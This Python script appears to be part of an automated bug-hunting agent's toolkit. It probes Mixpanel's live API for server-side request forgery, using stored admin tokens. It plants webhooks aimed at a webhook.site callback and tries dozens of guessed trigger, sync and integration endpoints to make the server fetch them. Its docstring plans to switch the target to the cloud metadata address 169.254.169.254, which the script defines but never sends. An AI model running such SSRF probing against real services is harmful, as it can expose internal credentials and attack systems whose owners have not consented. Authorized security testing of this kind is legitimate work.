#!/usr/bin/env python3
"""SSRF trigger discovery — find any code path that fires a stored webhook.
Strategy:
 1. Create a benign webhook with webhook.site URL → confirm fires via /test (baseline).
 2. Enumerate cohort APIs → list, create, attach webhook, sync_now.
 3. Probe trigger paths: /webhooks/{W}/fire,trigger,run,execute,send,sync,etc.
 4. Probe alert/integration/export APIs for any webhook-firing path.
 5. Probe delivery-log readback endpoints.
 6. If trigger found firing webhook.site → swap to IMDS URL and retry once.
 7. Pre-clean: delete every webhook/cohort/alert we create.
"""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

TARGET = 'mixpanel'
tokens = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
ADMIN = tokens['ADMIN']
H_BASE = ADMIN['api_request_headers']
# Force JSON content-type per POST
PROJECT = 4025923

# Use webhook.site UUID issued at start
OAST_UUID = '3028c45a-5f34-4192-bad3-dba270e80b06'
OAST_URL = f'https://webhook.site/{OAST_UUID}'
IMDS_URL = 'http://169.254.169.254/latest/meta-data/'

sh = SafeHttp(allow_raw_for_waf=True)
LOG = f'/home/hunter/new_agent/targets/{TARGET}/notes/session-log.md'
RES = f'/home/hunter/new_agent/results/{TARGET}/ssrf-trigger-{int(time.time())}.json'
results = []

def log(m):
    with open(LOG,'a') as f: f.write(f"[{time.strftime('%H:%M:%S')}] SSRF-TRIGGER: {m}\n")
    print(f"SSRF-TRIGGER: {m}")

def req(method, path, body=None, extra_headers=None):
    url = f'https://mixpanel.com{path}'
    h = dict(H_BASE)
    if extra_headers: h.update(extra_headers)
    h['Content-Type'] = 'application/json'
    try:
        kwargs = {"headers": h, "timeout": 15}
        if body is not None:
            kwargs['data'] = json.dumps(body)
        r = sh.request(method, url, **kwargs)
        code = r.status_code
        try:
            j = r.json()
            body_short = json.dumps(j)[:300]
        except:
            body_short = r.text[:300]
        return code, body_short, r
    except Exception as e:
        return -1, str(e)[:200], None

def record(tag, method, path, code, body_short, extra=None):
    e = {"tag": tag, "method": method, "path": path, "code": code, "body": body_short, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ")}
    if extra: e.update(extra)
    results.append(e)
    log(f"{tag} {method} {path} -> {code} | {body_short[:150]}")

# === PHASE 1: Create benign webhook with OAST URL ===
log("=== PHASE 1: baseline webhook with webhook.site URL ===")
code, body, r = req('POST', f'/api/app/projects/{PROJECT}/webhooks',
                    {"name": "trigger-probe-oast", "url": OAST_URL})
record("P1-create-oast", "POST", f"/api/app/projects/{PROJECT}/webhooks", code, body)
oast_wh_id = None
if code in (200, 201):
    try:
        oast_wh_id = (r.json().get('results') or {}).get('id')
        log(f"oast_wh_id={oast_wh_id}")
    except: pass

# === PHASE 2: List cohorts, then create one ===
log("=== PHASE 2: cohort enumeration + create ===")
for p in [
    f'/api/app/projects/{PROJECT}/cohorts',
    f'/api/2.0/cohorts?project_id={PROJECT}',
    f'/api/app/projects/{PROJECT}/cohorts?page=1',
]:
    code, body, _ = req('GET', p)
    record("P2-list-cohorts", "GET", p, code, body)

# Cohort create attempts — multiple body shapes
cohort_bodies = [
    {"name": "trigger-probe-cohort", "description": "delete me"},
    {"name": "tp-c2", "params": {"event": "$any", "from_date": "2026-01-01", "to_date": "2026-05-30"}},
    {"name": "tp-c3", "filters": []},
    {"name": "tp-c4", "groups": [{"event": "$any_event", "filter": {"selector": "true"}}]},
]
cohort_id = None
for b in cohort_bodies:
    code, body, r = req('POST', f'/api/app/projects/{PROJECT}/cohorts', b)
    record("P2-create-cohort", "POST", f'/api/app/projects/{PROJECT}/cohorts', code, body, {"body_shape": list(b.keys())})
    if code in (200, 201):
        try:
            cohort_id = (r.json().get('results') or {}).get('id')
            log(f"cohort_id={cohort_id}")
            break
        except: pass

# === PHASE 3: Direct webhook trigger endpoints ===
log("=== PHASE 3: direct webhook trigger probes ===")
if oast_wh_id:
    trigger_verbs = ['fire','trigger','run','execute','send','preview','sync','sync_now','dispatch','replay','invoke','flush','deliver','call']
    for verb in trigger_verbs:
        path = f'/api/app/projects/{PROJECT}/webhooks/{oast_wh_id}/{verb}'
        code, body, _ = req('POST', path, {})
        record(f"P3-trigger-{verb}", "POST", path, code, body)
        # Also try GET
        code2, body2, _ = req('GET', path)
        record(f"P3-trigger-{verb}-GET", "GET", path, code2, body2)

# === PHASE 4: Webhook delivery-log endpoints ===
log("=== PHASE 4: delivery log probes ===")
if oast_wh_id:
    log_verbs = ['deliveries','logs','history','runs','events','attempts','calls','requests','test_results','deliveries.json']
    for verb in log_verbs:
        path = f'/api/app/projects/{PROJECT}/webhooks/{oast_wh_id}/{verb}'
        code, body, _ = req('GET', path)
        record(f"P4-log-{verb}", "GET", path, code, body)

# === PHASE 5: Attach webhook → cohort, then sync ===
log("=== PHASE 5: cohort↔webhook attach + sync ===")
if cohort_id and oast_wh_id:
    # Patch shapes
    attach_bodies = [
        {"webhook_id": oast_wh_id},
        {"webhook": oast_wh_id},
        {"integration_id": oast_wh_id, "integration_type": "webhook"},
        {"sync": {"webhook_id": oast_wh_id, "actions": ["members"]}},
    ]
    for b in attach_bodies:
        for m in ['PATCH','PUT','POST']:
            path = f'/api/app/projects/{PROJECT}/cohorts/{cohort_id}'
            code, body, _ = req(m, path, b)
            record(f"P5-attach-{m}", m, path, code, body, {"body": b})

    # Cohort sync trigger probes
    sync_verbs = ['sync','sync_now','refresh','run','trigger','recompute','dispatch','send','fire']
    for v in sync_verbs:
        path = f'/api/app/projects/{PROJECT}/cohorts/{cohort_id}/{v}'
        code, body, _ = req('POST', path, {"webhook_id": oast_wh_id, "actions": ["members"]})
        record(f"P5-cohort-{v}", "POST", path, code, body)

    # Sub-resource probes
    for sub in ['integrations','webhooks','syncs','exports']:
        path = f'/api/app/projects/{PROJECT}/cohorts/{cohort_id}/{sub}'
        code, body, _ = req('POST', path, {"webhook_id": oast_wh_id, "actions": ["members"], "integration_type": "webhook"})
        record(f"P5-cohort-sub-{sub}", "POST", path, code, body)
        code, body, _ = req('GET', path)
        record(f"P5-cohort-sub-{sub}-GET", "GET", path, code, body)

# === PHASE 6: Integrations API (root was 404 for GET — try POST + variants) ===
log("=== PHASE 6: integrations API ===")
for path in [
    f'/api/app/projects/{PROJECT}/integrations',
    f'/api/app/projects/{PROJECT}/integrations/cohort_sync',
    f'/api/app/projects/{PROJECT}/integrations/webhook',
    f'/api/app/projects/{PROJECT}/integrations/cohort_sync/run',
    f'/api/app/projects/{PROJECT}/integrations/webhook/run',
    f'/api/app/projects/{PROJECT}/integrations/webhook/sync',
    f'/api/app/projects/{PROJECT}/integrations/webhook/test',
]:
    for m, body in [('POST', {"url": OAST_URL, "name": "tp-integ", "type": "webhook"}),
                    ('GET', None)]:
        code, b, _ = req(m, path, body)
        record(f"P6-integ-{m}", m, path, code, b)

# === PHASE 7: custom_alerts (per investigation note) ===
log("=== PHASE 7: custom_alerts ===")
for path in [
    f'/api/app/projects/{PROJECT}/custom_alerts',
    f'/api/app/projects/{PROJECT}/alerts',
    f'/api/app/projects/{PROJECT}/notifications',
    f'/api/app/projects/{PROJECT}/notifications/webhooks',
    f'/api/app/projects/{PROJECT}/exports',
    f'/api/app/projects/{PROJECT}/data_pipelines',
]:
    for m, body in [('GET', None),
                    ('POST', {"name":"tp-alert","webhook_url":OAST_URL,"url":OAST_URL,"destination":OAST_URL})]:
        code, b, _ = req(m, path, body)
        record(f"P7-{path.split('/')[-1]}-{m}", m, path, code, b)

# === PHASE 8: Test webhook on the stored OAST webhook to confirm fire (baseline) ===
log("=== PHASE 8: confirm OAST webhook fires via /test ===")
if oast_wh_id:
    code, body, _ = req('POST', f'/api/app/projects/{PROJECT}/webhooks/test',
                        {"url": OAST_URL, "name": "trigger-probe-oast"})
    record("P8-test-direct-oast", "POST", f'/api/app/projects/{PROJECT}/webhooks/test', code, body)
    # Test with webhook_id reference (if API supports that shape)
    code, body, _ = req('POST', f'/api/app/projects/{PROJECT}/webhooks/test',
                        {"webhook_id": oast_wh_id})
    record("P8-test-by-id", "POST", f'/api/app/projects/{PROJECT}/webhooks/test', code, body)

# === CLEANUP ===
log("=== CLEANUP ===")
if oast_wh_id:
    code, body, _ = req('DELETE', f'/api/app/projects/{PROJECT}/webhooks/{oast_wh_id}')
    record("CLEAN-wh", "DELETE", f'/api/app/projects/{PROJECT}/webhooks/{oast_wh_id}', code, body)
if cohort_id:
    code, body, _ = req('DELETE', f'/api/app/projects/{PROJECT}/cohorts/{cohort_id}')
    record("CLEAN-cohort", "DELETE", f'/api/app/projects/{PROJECT}/cohorts/{cohort_id}', code, body)

# Save results
out = {"oast_uuid": OAST_UUID, "oast_url": OAST_URL, "oast_webhook_id": oast_wh_id,
       "cohort_id": cohort_id, "results": results}
with open(RES, 'w') as f: json.dump(out, f, indent=2)
log(f"Saved {RES} entries={len(results)}")
print(f"\nSAVED: {RES}")
print(f"OAST UUID for inspection: {OAST_UUID}")
print(f"OAST webhook id: {oast_wh_id}")
print(f"Cohort id: {cohort_id}")
